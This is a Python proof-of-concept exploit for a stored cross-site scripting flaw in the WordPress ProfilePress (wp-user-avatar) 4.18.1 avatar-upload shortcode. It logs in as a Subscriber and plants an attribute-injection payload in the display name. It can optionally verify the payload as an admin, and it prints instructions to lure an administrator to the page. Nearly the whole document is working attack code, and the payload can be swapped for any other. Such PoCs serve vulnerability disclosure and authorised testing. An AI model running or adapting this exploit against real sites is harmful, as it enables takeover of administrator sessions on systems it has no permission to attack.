#!/usr/bin/env python3
"""
PoC - Stored XSS
=========================================================

The legacy WP User Avatar uploader renders the user's display name inside a
`data-title` attribute without escaping:

    <button ... data-title="Choose Image: <?php echo $user->display_name; ?>">

`[avatar_upload user="<login>"]` resolves the target with get_user_by() and
passes a *raw* WP_User object to that uploader. A Subscriber can therefore store
a display name such as:

    " autofocus onfocus="alert(document.domain)

and the payload becomes real HTML attributes when an administrator views the
page containing the shortcode.

For the record: the admin `user-edit.php` screen is NOT vulnerable, because
`get_user_to_edit()` sets `filter = 'edit'` and `WP_User::__get()` escapes the
value with `esc_attr()` before it reaches the sink.

Usage
-----
    python3 poc.py --url=http://target/wordpress/avatar-upload-page/

Optional:
    --username / --password   Subscriber credentials (defaults: victimsub / SubPass123!)
    --admin-user / --admin-password
                              If supplied, the script also logs in as the admin
                              and confirms that the raw XSS attributes are served.
    --payload                 Custom payload (default: " autofocus onfocus="alert(document.domain))
    --login-url               Explicit wp-login.php URL (auto-detected by default)

Only use this against systems you own or have permission to test.
"""

import argparse
import html
import os
import re
import sys
from html.parser import HTMLParser
from urllib.parse import urljoin, urlsplit, urlunsplit

try:
    import requests
except ImportError:
    sys.exit("[-] requests is required: pip install requests")

DEFAULT_PAYLOAD = '" autofocus onfocus="alert(document.domain)'
USER_AGENT = "Mozilla/5.0 (PoC; ProfilePress 4.18.1 stored XSS)"


# ---------------------------------------------------------------------------
# Minimal form parser (stdlib only) - collects form controls from one form.
# ---------------------------------------------------------------------------
class FormParser(HTMLParser):
    def __init__(self, form_id):
        super().__init__(convert_charrefs=True)
        self.form_id = form_id
        self.in_form = False
        self.fields = {}
        self._textarea = None
        self._select = None
        self._options = []
        self._option = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "form":
            if attrs.get("id") == self.form_id:
                self.in_form = True
            return
        if not self.in_form:
            return

        if tag == "input":
            name = attrs.get("name")
            if not name:
                return
            typ = (attrs.get("type") or "text").lower()
            if typ in ("submit", "button", "reset", "image", "file"):
                return
            if typ in ("checkbox", "radio") and "checked" not in attrs:
                return
            self.fields[name] = attrs.get("value", "on")

        elif tag == "textarea":
            name = attrs.get("name")
            if name:
                self._textarea = name
                self.fields[name] = ""

        elif tag == "select":
            self._select = attrs.get("name")
            self._options = []
            self._option = None

        elif tag == "option" and self._select:
            self._option = {
                "value": attrs.get("value"),
                "text": "",
                "selected": "selected" in attrs,
            }

    def handle_data(self, data):
        if not self.in_form:
            return
        if self._textarea:
            self.fields[self._textarea] += data
        if self._option is not None:
            self._option["text"] += data

    def handle_endtag(self, tag):
        if not self.in_form:
            return
        if tag == "textarea":
            self._textarea = None
        elif tag == "option" and self._option is not None:
            self._options.append(self._option)
            self._option = None
        elif tag == "select":
            if self._select:
                selected = next((o for o in self._options if o["selected"]), None)
                if selected is None and self._options:
                    selected = self._options[0]
                if selected is not None:
                    value = selected["value"]
                    if value is None:
                        value = selected["text"].strip()
                    self.fields[self._select] = value
            self._select = None
            self._options = []
        elif tag == "form":
            self.in_form = False


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def eprint(*args):
    print(*args, file=sys.stderr)


def find_login_url(session, page_url, explicit=None, timeout=20):
    if explicit:
        return explicit

    parts = urlsplit(page_url)
    path = parts.path or "/"
    # Start with the directory that contains the target page.
    if path.endswith("/"):
        base = path.rstrip("/")
    else:
        base = path.rsplit("/", 1)[0]

    candidates = []
    while True:
        candidates.append(base)
        if base in ("", "/"):
            break
        base = base.rsplit("/", 1)[0]

    seen = set()
    for directory in candidates:
        directory = directory.rstrip("/")
        login_path = (directory + "/wp-login.php") if directory else "/wp-login.php"
        candidate = urlunsplit((parts.scheme, parts.netloc, login_path, "", ""))
        if candidate in seen:
            continue
        seen.add(candidate)
        try:
            r = session.get(candidate, timeout=timeout, headers={"User-Agent": USER_AGENT})
        except requests.RequestException:
            continue
        if r.status_code == 200 and "user_login" in r.text and "wp-submit" in r.text:
            return candidate

    # Last resort: origin.
    return urlunsplit((parts.scheme, parts.netloc, "/wp-login.php", "", ""))


def login(session, login_url, username, password, timeout=20):
    session.get(login_url, timeout=timeout, headers={"User-Agent": USER_AGENT})
    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": urljoin(login_url, "wp-admin/"),
        "testcookie": "1",
    }
    r = session.post(login_url, data=data, timeout=timeout, headers={"User-Agent": USER_AGENT})
    logged_in = any("wordpress_logged_in" in c.name for c in session.cookies)
    if not logged_in and "wp-admin" not in r.url:
        raise RuntimeError(
            "login failed (check --username/--password and --login-url); "
            "server said: " + re.sub(r"\s+", " ", r.text)[:300]
        )
    return r


def get_profile_form(session, profile_url, timeout=20):
    r = session.get(profile_url, timeout=timeout, headers={"User-Agent": USER_AGENT})
    if "your-profile" not in r.text:
        raise RuntimeError("could not load profile.php (not logged in?)")
    parser = FormParser("your-profile")
    parser.feed(r.text)
    fields = parser.fields
    if "_wpnonce" not in fields or "user_id" not in fields:
        raise RuntimeError("could not find _wpnonce/user_id in profile form")
    return r, fields


def store_payload(session, profile_url, fields, payload, timeout=20):
    data = dict(fields)
    data["action"] = "update"
    data["display_name"] = payload
    # These are required by edit_user() when updating an existing user.
    if not data.get("nickname"):
        data["nickname"] = fields.get("user_login") or data.get("user_id") or "user"
    if not data.get("email"):
        raise RuntimeError("could not determine the account email; use a fully loaded profile form")

    r = session.post(profile_url, data=data, timeout=timeout, headers={"User-Agent": USER_AGENT})
    text = html.unescape(r.text)
    if "Profile updated" not in text and "updated=true" not in r.url:
        snippet = re.sub(r"\s+", " ", text)
        raise RuntimeError("profile update did not report success: " + snippet[:500])
    return r


def verify_as_admin(login_url, page_url, admin_user, admin_password, target_user, payload,
                    timeout=20, insecure=False):
    s = requests.Session()
    s.verify = not insecure
    login(s, login_url, admin_user, admin_password, timeout=timeout)
    r = s.get(page_url, timeout=timeout, headers={"User-Agent": USER_AGENT})
    raw = r.text
    # The vulnerable output looks like (browsers normalise the boolean attribute):
    # data-title="Choose Image: " autofocus onfocus="alert(document.domain)"
    onfocus_value = None
    if 'onfocus="' in payload:
        onfocus_value = payload.split('onfocus="', 1)[1].split('"', 1)[0]
    confirmed = (
        'data-title="Choose Image: "' in raw
        and re.search(r'\bautofocus(?:\s|>|=)', raw) is not None
        and (onfocus_value is None or 'onfocus="%s"' % onfocus_value in raw)
    )
    print("[*] Admin GET %s -> HTTP %s" % (page_url, r.status_code))
    if confirmed:
        print("[+] XSS CONFIRMED: the admin page contains the injected autofocus/onfocus attributes.")
    else:
        print("[-] XSS attributes were not found in the admin response.")
        print("    Check that the page contains [avatar_upload user=\"%s\"] and is published." % target_user)
    return confirmed


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="Stored XSS PoC for ProfilePress (wp-user-avatar) 4.18.1 via [avatar_upload user=...]"
    )
    ap.add_argument("--url", required=True, help="URL of the page/post containing [avatar_upload user=\"<login>\"]")
    ap.add_argument("--username", default=os.environ.get("WP_USER", "victimsub"),
                    help="Subscriber username (default: env WP_USER or victimsub)")
    ap.add_argument("--password", default=os.environ.get("WP_PASS", "SubPass123!"),
                    help="Subscriber password (default: env WP_PASS or SubPass123!)")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload to store as display_name")
    ap.add_argument("--login-url", default=None, help="Explicit wp-login.php URL (auto-detected otherwise)")
    ap.add_argument("--admin-user", default=None, help="Optional admin username for verification")
    ap.add_argument("--admin-password", default=None, help="Optional admin password for verification")
    ap.add_argument("--timeout", type=int, default=20, help="HTTP timeout in seconds (default: 20)")
    ap.add_argument("--insecure", action="store_true", help="Do not verify TLS certificates")
    args = ap.parse_args()

    if args.insecure:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    session = requests.Session()
    session.verify = not args.insecure

    try:
        login_url = find_login_url(session, args.url, args.login_url, args.timeout)
        print("[*] WordPress login: %s" % login_url)

        login(session, login_url, args.username, args.password, args.timeout)
        print("[+] Logged in as Subscriber: %s" % args.username)

        # Derive the wp-admin URL from wp-login.php.
        admin_base = login_url.rsplit("/wp-login.php", 1)[0] + "/wp-admin/"
        profile_url = admin_base + "profile.php"

        _, fields = get_profile_form(session, profile_url, args.timeout)
        print("[*] Profile form loaded (user_id=%s)" % fields.get("user_id"))

        store_payload(session, profile_url, fields, args.payload, args.timeout)
        print("[+] Payload stored in display_name: %r" % args.payload)

        # Confirm the value is now returned by the profile page.
        r = session.get(profile_url, timeout=args.timeout, headers={"User-Agent": USER_AGENT})
        if args.payload in html.unescape(r.text):
            print("[+] Stored value verified on profile.php")
        else:
            eprint("[!] Warning: could not re-find the payload on profile.php")

        # The data-title sink is only rendered for users with Author+ capabilities
        # (wpua_is_author_or_above()). A Subscriber sees the simple file input instead.
        page = session.get(args.url, timeout=args.timeout, headers={"User-Agent": USER_AGENT})
        if 'id="wpua-add' in page.text or "id='wpua-add" in page.text:
            print("[+] Target page rendered the data-title uploader for this account.")
        else:
            print("[*] As expected, this Subscriber sees the plain upload input;")
            print("    the data-title sink is only rendered for Author+ users, i.e. the admin victim.")

        print()
        print("[*] Next step: make an administrator open this URL while logged in:")
        print("    %s" % args.url)
        print("[*] The payload executes as soon as the page loads (autofocus/onfocus).")

        if args.admin_user and args.admin_password:
            verify_as_admin(login_url, args.url, args.admin_user, args.admin_password,
                            args.username, args.payload, args.timeout, args.insecure)

    except Exception as exc:
        eprint("[-] %s" % exc)
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
